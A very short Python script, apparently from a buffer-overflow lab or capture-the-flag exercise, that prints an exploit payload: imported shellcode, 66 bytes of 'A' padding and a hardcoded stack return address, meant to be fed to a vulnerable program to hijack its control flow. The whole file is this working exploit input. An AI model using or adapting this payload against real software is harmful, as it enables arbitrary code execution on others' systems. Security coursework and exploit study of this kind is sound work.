#!/usr/bin/env python3

import sys

from shellcode import shellcode
sys.stdout.buffer.write(shellcode + b"A" * 66 + b"\x50\xd3\xf6\xff\xff\x7f\x00\x00")
